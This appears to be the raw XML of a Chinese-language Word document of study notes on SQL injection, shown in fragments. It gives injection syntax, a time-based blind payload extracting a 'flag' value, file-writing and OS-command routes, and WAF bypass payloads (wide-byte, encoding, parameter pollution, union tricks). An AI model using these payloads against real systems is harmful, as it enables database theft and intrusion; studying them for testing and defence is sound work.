          <w:numId w:val="64"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入语法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Insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>insert into table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (c1,c2,c3) values (v1,’test’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cmd], v3);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Delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">delete </w:t>
      </w:r>
      <w:r>
        <w:t>from table where c1=v1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cmd];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>Update</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">update table </w:t>
      </w:r>
      <w:r>
        <w:t>set c1=v1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cmd];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC37A1" w:rsidRDefault="00EC37A1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>示例</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC37A1" w:rsidRDefault="00EC37A1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000161A9" w:rsidRPr="00EC37A1" w:rsidRDefault="00C220F1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>insert</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into </w:t>
      </w:r>
      <w:r w:rsidRPr="00C220F1">
        <w:t>client_ip (ip) values ('asd' or (select case when (substring((select flag f</w:t>
      </w:r>
      <w:r>
        <w:t>rom flag ) from 1 for 1 )='w</w:t>
      </w:r>
      <w:r w:rsidRPr="00C220F1">
        <w:t>') then sleep(5) else sleep(0) end))#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>updatexml()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026686B" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>extrac</w:t>
      </w:r>
      <w:r>
        <w:t>tvalue()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026686B" w:rsidRPr="0026686B" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>name_const()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00D77A34">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>访问操作系统</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>写文件</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr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>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select into outfile(dumpfile)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r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CA0CA4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的扩展存储过程，可以通过调用该存储过程来执行操作系统命令。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BA22DE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BA22DE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BA22DE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根据</w:t>
      </w:r>
      <w:r>
        <w:t>嵌套的层次进行绕过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EB7545" w:rsidRDefault="00EB7545" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>空白符编码绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB7545" w:rsidRDefault="00EB7545" w:rsidP="00EB7545">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BEA83ED" wp14:editId="5ED3DF81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53" w:rsidRPr="00DF0994" w:rsidRDefault="00855A53" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r w:rsidRPr="00DF0994">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>宽字节</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF0994">
        <w:t>绕过办法：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855A53" w:rsidRDefault="00855A53" w:rsidP="00855A5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855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>’\xbf\x27’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00311E98" w:rsidP="00311E98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MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型转换特性绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00311E98" w:rsidRPr="00311E98" w:rsidRDefault="008A2112" w:rsidP="00311E98">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">select * from table where </w:t>
      </w:r>
      <w:r>
        <w:t>username</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’=’a’;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>根据约定从左向右执行，所以先执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>username=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’</w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一般该值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句变为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from table where false=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’</w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>接着再计算时，</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将等号两边都转为数字后再比较。</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:t>alse</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>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</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:t>’a’</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>也转为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，所以等式成立。最终语句变为</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from table where true;</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，形成万能密码注入绕过。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E" w:rsidRDefault="00BA22DE" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA22DE" w:rsidRDefault="00BA22DE" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过排序变化实现暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA22DE" w:rsidRDefault="00F77709" w:rsidP="008918F9">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过对目标列的排序，可以实现对目标列</w:t>
      </w:r>
      <w:r w:rsidR="00C44C2D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F77709" w:rsidRDefault="00F77709" w:rsidP="008918F9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003800" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="25400" b="1778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>select * from table where username=’xx’ union select 1,2,0x5346… order by 3 desc -- mysql</w:t>
                            </w:r>
                            <w:r>
                              <w:t>语句（字符</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>拼接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9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>select * from table where username=’xx’ union select 1,2,0x5346… order by 3 desc -- mysql</w:t>
                      </w:r>
                      <w:r>
                        <w:t>语句（字符</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>拼接</w:t>
                      </w:r>
                      <w:r>
                        <w:t>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0D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="00F517F1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:hyperlink r:id="rId51" w:history="1">
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>http://xxx.asp?id=1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="000F40D1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F40D1">
        <w:t>an%d 1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0F40D1" w:rsidRDefault="00F517F1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:hyperlink r:id="rId52" w:history="1">
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>http://xx.aspx?i</w:t>
        </w:r>
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
          </w:rPr>
          <w:t>d=1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="000F40D1">
        <w:t xml:space="preserve"> union s%u0065lect ‘hi’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Pr="00136C85" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>select===s%u0065===s%u00f0lect</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:r w:rsidRPr="007531EF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="091B20AD" wp14:editId="70C14F3B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D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>HPP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>直接</w:t>
      </w:r>
      <w:r>
        <w:t>针对参数的污染</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="003A5240">
        <w:t>?id=1&amp;id=2&amp;id=3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>DB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>层</w:t>
      </w:r>
      <w:r>
        <w:t>Bypass(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>参考</w:t>
      </w:r>
      <w:r>
        <w:t>君立华域</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>waf</w:t>
      </w:r>
      <w:r>
        <w:t>bypass.pdf</w:t>
      </w:r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5pt" o:ole="">
            <v:imagedata r:id="rId54" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Acrobat.Document.11" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1565380844" r:id="rId55"/>
        </w:object>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1.0union select 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1E0union select 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1\Nunionselect 1,2,3,4,5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="420" w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1/*!5000union*/ select 1,2,3,4,5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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>select * from user_listwhere uid=1 union(select 1,2,3,4,5)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括号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select(1),2,3,4,5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单引号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select'1',2,3,4,5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双引号：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from user_listwhere uid=1 union select"1",2,3,4,5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lastRenderedPageBreak/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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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0F40D1" w:rsidRPr="00BA22DE" w:rsidRDefault="000F40D1" w:rsidP="000F40D1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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr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27D92" w:rsidRDefault="00B27D92" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其他表示方式</w:t>
      </w:r>
      <w:r w:rsidR="00B50F25">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(mysql)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B27D92" w:rsidRDefault="00B27D92" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>substring([string],[pos],[len])==</w:t>
      </w:r>
      <w:r w:rsidR="008948CF">
        <w:t>substring([string] from [pos] for [len])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008948CF" w:rsidRDefault="008948CF" w:rsidP="0031513A">
      <w:pPr>
        <w:ind w:leftChars="300" w:left="630" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>mid([string],[start])==mid([string] from [start])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BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/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BA22DE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Default="009F61D1" w:rsidP="00BA22DE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p w:rsidR="00A71DCA" w:rsidRPr="00A71DCA" w:rsidRDefault="00A71DCA" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通用函数</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="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90028" w:rsidTr="00E37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2500" w:type="pct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@@datadir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2500" w:type="pct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500A6C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500A6C" w:rsidP="009F61D1">
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>mid</w:t>
            </w:r>
            <w:r w:rsidR="0001730E">
              <w:t>(</w:t>
            </w:r>
            <w:r w:rsidR="00167C97">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>string</w:t>
            </w:r>
            <w:r w:rsidR="0001730E">
              <w:t>,start[,length])</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00500A6C" w:rsidRPr="0001730E" w:rsidRDefault="00167C97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500A6C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282253" w:rsidP="009F61D1">
            <w:r>
              <w:t>left(‘string’,num)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsidR="00500A6C" w:rsidRPr="00990028" w:rsidRDefault="00167C97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</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>字符串</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>string</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>左边</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>num</w:t>
            </w:r>
            <w:r w:rsidR="00282253">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>位，不区分大小写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group_concate(column</w:t>
            </w:r>
            <w:r>
              <w:t>_name)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2500" w:type="pct"/>
          </w:tcPr>
          <w:p w:rsid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经常和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一起使用，自动根据规则将列值拼接成一个字符串</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00785D8D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concate(str1,str2,str3,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将多个字符串拼接为一个，界定符为逗号（，）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concate_ws(delimiter,str1,str2,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指定界定符，将多个字符串拼接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C62" w:rsidRDefault="008C7807" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>substr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8C7807" w:rsidTr="00715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7807" w:rsidRDefault="008C7807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  <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>，</w:t>
            </w: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 w:val="restart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077D92" w:rsidTr="007153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C7807" w:rsidRDefault="00D801D9" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ascii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D801D9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Default="00D801D9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D801D9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asci(‘char’)</w:t>
            </w:r>
            <w:r w:rsidR="00EA2744">
              <w:t>,ord(‘char’)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00D801D9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</w:t>
            </w:r>
            <w:r>
              <w:t>’char’</w:t>
            </w:r>
            <w:r w:rsidR="00D91C11">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>第一个</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>字符的十进制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码。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0024368F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反向函数为</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>char(FF,FF,FD,FE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D801D9" w:rsidTr="00243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01D9" w:rsidRDefault="00A55EF3" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>hex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>等进制转换函数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CE2D8A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Default="00CE2D8A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CE2D8A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bin</w:t>
            </w:r>
            <w:r>
              <w:t>(num)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00532934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oct(num)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00532934" w:rsidRPr="00990028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hex(num)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3351" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00CE2D8A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二进制</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00974D42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八进制</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00974D42" w:rsidRPr="00990028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十六</w:t>
            </w:r>
            <w:r w:rsidR="005E7A43">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>进制</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
